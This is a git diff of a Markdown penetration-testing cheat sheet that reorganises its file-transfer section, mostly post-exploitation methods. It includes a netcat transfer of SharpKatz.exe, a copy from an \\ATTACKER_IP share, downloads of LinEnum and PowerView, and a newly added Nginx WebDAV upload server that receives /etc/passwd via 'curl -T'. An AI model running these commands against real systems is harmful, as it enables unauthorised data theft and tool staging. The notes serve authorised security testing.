@@ -13,9 +13,9 @@
   - [Executables](#executables)
   - [Finding Important Files](#finding-important-files)
 - [File Transfer](#file-transfer)
-  - [Other Ways](#other-ways)
-  - [Using code](#using-code)
+  - [Native tools](#native-tools)
   - [Encrpytion](#encrpytion)
+  - [Using code](#using-code)
   - [Using HTTPS](#using-https)
 - [Searchexploit](#searchexploit)
 - [Code Analyse](#code-analyse)
@@ -174,7 +174,7 @@ for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo
       - sudo -u OWNER file
 
 - sudo -l
-- [for SUID files](https://gtfobins.github.io/gtfobins/find/)
+- [GTFOBins](https://gtfobins.github.io/gtfobins/find/)
 
 ### shared libraries 
 - sudo -l ==> LD_PRELOAD ==>   
@@ -334,7 +334,7 @@ cat <&3
   -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
   -  smbclient -U USER '//IP/folder'
 
-### Other Ways
+### Native tools
 - **NC**
   - Transfering files
       1. Start listener with nc with redirection
@@ -358,17 +358,21 @@ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 nc 192.168.49.128 443 > SharpKatz.exe
 ```
 
-- **PowerShell WinRM**
-  - Execute commands on remote computer: Member of group | Admin | Permissions
+- [Linux - GTFOBins](https://gtfobins.github.io/)
+  - +file download/upload
+
+### Encrpytion
+- openssl
+
 ```
-Test-NetConnection -ComputerName COMPUTERNAME -Port 5985
-$Session = New-PSSession -ComputerName COMPUTERNAME
+# Encrypt
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /input/file -out file.enc
+-enc = encryt
+-inter = iterations
+-pbkdf2 = password-based key derivation function 
 
-# LH=DB
-Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
-
-# DB=LH
-Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+# Decrypt
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in file.enc -out file
 ```
 
 ### Using code
@@ -377,7 +381,6 @@ Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -
 # Download
 python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
-
 
 # Upload
 ## Attacker 
@@ -442,21 +445,42 @@ end with
 cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
 
-### Encrpytion
-- openssl
-
-```
-# Encrypt
-openssl enc -aes256 -iter 100000 -pbkdf2 -in /input/file -out file.enc
--enc = encryt
--inter = iterations
--pbkdf2 = password-based key derivation function 
-
-# Decrypt
-openssl enc -d -aes256 -iter 100000 -pbkdf2 -in file.enc -out file
-```
-
 ### Using HTTPS
+- **Nginx**
+```
+# Attacker
+## Create Folder to updates
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+
+## Change owner
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+
+## Create Nginx config file
+in /etc/nginx/sites-available/upload.conf 
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+
+## Symling Site do sites-enabled
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+
+## Start nginx
+sudo systemctl restart nginx.service
+
+## Problem with port = remove default nginx
+
+## Connect
+curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
+```
+- 
+- 
+-  **Apache**
 
 
 ## Searchexploit
